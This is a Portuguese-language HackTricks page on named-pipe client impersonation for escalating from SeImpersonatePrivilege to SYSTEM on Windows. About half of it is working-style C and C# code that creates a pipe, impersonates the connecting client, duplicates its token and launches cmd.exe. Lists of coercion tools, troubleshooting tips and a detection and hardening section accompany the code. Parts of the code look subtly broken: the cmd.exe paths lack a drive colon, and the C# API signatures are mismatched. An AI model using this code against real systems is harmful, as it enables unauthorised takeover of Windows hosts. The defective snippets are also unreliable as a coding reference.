# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation é um primitivo de elevação de privilégio local que permite que uma thread de server de named-pipe adote o contexto de segurança de um cliente que se conecta a ela. Na prática, um atacante que consegue executar código com SeImpersonatePrivilege pode forçar um cliente privilegiado (por exemplo, um serviço SYSTEM) a conectar-se a um pipe controlado pelo atacante, chamar ImpersonateNamedPipeClient, duplicar o token resultante em um token primário e spawnar um processo como o cliente (frequentemente NT AUTHORITY\SYSTEM).

Esta página foca na técnica central. Para cadeias de exploit ponta a ponta que forçam SYSTEM a conectar-se ao seu pipe, veja as páginas da família Potato referenciadas abaixo.

## TL;DR
- Crie um named pipe: \\.\pipe\<random> e aguarde uma conexão.
- Faça um componente privilegiado conectar-se a ele (spooler/DCOM/EFSRPC/etc.).
- Leia ao menos uma mensagem do pipe, então chame ImpersonateNamedPipeClient.
- Abra o token de impersonation da thread atual, DuplicateTokenEx(TokenPrimary) e use CreateProcessWithTokenW/CreateProcessAsUser para obter um processo SYSTEM.

## Requisitos e APIs principais
- Privilégios tipicamente necessários pelo processo/thread que chama:
- SeImpersonatePrivilege para conseguir impersonar com sucesso um cliente que conecta e para usar CreateProcessWithTokenW.
- Alternativamente, após impersonar SYSTEM, você pode usar CreateProcessAsUser, que pode requerer SeAssignPrimaryTokenPrivilege e SeIncreaseQuotaPrivilege (estes são satisfeitos quando você está impersonando SYSTEM).
- APIs centrais usadas:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (é preciso ler ao menos uma mensagem antes da impersonation)
- ImpersonateNamedPipeClient e RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ou CreateProcessAsUser
- Nível de impersonation: para executar ações úteis localmente, o cliente deve permitir SecurityImpersonation (padrão para muitos clientes RPC/named-pipe locais). Clientes podem reduzir isso com SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ao abrir o pipe.

## Fluxo Win32 mínimo (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
- Se ImpersonateNamedPipeClient retornar ERROR_CANNOT_IMPERSONATE (1368), verifique se você leu do pipe primeiro e se o cliente não restringiu a impersonação ao nível Identification.
- Prefira DuplicateTokenEx com SecurityImpersonation e TokenPrimary para criar um token primário adequado para criação de processos.

## Exemplo rápido em .NET
No .NET, NamedPipeServerStream pode impersonar via RunAsClient. Uma vez impersonando, duplique o token da thread e crie um processo.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Gatilhos/coerções comuns para fazer com que o SYSTEM se conecte à sua named pipe
Essas técnicas forçam serviços privilegiados a se conectar à sua named pipe para que você possa impersonate eles:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Veja uso detalhado e compatibilidade aqui:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Se você só precisa de um exemplo completo de como criar a pipe e impersonate para spawn SYSTEM a partir de um gatilho de serviço, veja:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Solução de problemas e cuidados
- Você deve ler ao menos uma mensagem da pipe antes de chamar ImpersonateNamedPipeClient; caso contrário receberá ERROR_CANNOT_IMPERSONATE (1368).
- Se o cliente conectar com SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, o servidor não pode realizar impersonation completo; verifique o nível de impersonation do token via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requer SeImpersonatePrivilege no chamador. Se isso falhar com ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser depois de já ter impersonated SYSTEM.
- Assegure que o security descriptor da sua pipe permita que o serviço alvo se conecte caso você o endureça; por padrão, pipes sob \\.\pipe são acessíveis de acordo com a DACL do servidor.

## Detecção e hardening
- Monitore criação e conexões de named pipes. Sysmon Event IDs 17 (Pipe Created) e 18 (Pipe Connected) são úteis para criar uma baseline de nomes de pipe legítimos e detectar pipes incomuns, com aparência aleatória, que precedem eventos de manipulação de token.
- Procure por sequências: processo cria uma pipe, um serviço SYSTEM se conecta, então o processo criador gera um processo filho como SYSTEM.
- Reduza a exposição removendo SeImpersonatePrivilege de contas de serviço não essenciais e evitando logons de serviço desnecessários com privilégios elevados.
- Desenvolvimento defensivo: ao conectar a named pipes não confiáveis, especifique SECURITY_SQOS_PRESENT com SECURITY_IDENTIFICATION para impedir que servidores impersonateiem totalmente o cliente, a menos que necessário.

## Referências
- Windows: ImpersonateNamedPipeClient documentation (requisitos e comportamento de impersonation). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (passo a passo e exemplos de código). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
